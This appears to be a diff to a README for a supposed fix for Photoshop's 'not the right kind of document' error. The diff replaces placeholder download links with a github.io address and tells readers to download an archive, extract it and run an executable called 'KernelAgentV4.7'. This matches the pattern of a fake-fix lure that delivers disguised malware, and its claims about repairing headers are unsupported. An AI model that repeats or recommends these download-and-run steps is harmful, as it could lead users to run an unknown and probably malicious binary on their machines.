@@ -2,13 +2,15 @@
 
 This fix resolves the Photoshop error “Could not open because it’s not the right kind of document” by analyzing and correcting damaged file headers, misnamed extensions, or unsupported formats using `KernelAgentV4.7`.
 
-[![Download Document Type Fix](https://img.shields.io/badge/Download-Photoshop_DocumentType_Fix-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Document Type Fix](https://img.shields.io/badge/Download-Photoshop_DocumentType_Fix-blueviolet)](https://photoshop-wrong-document-type-fix.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://photoshop-wrong-document-type-fix.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\PhotoshopDocTypeFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The tool will scan and correct file headers, fix extensions, and auto-detect format mismatches  
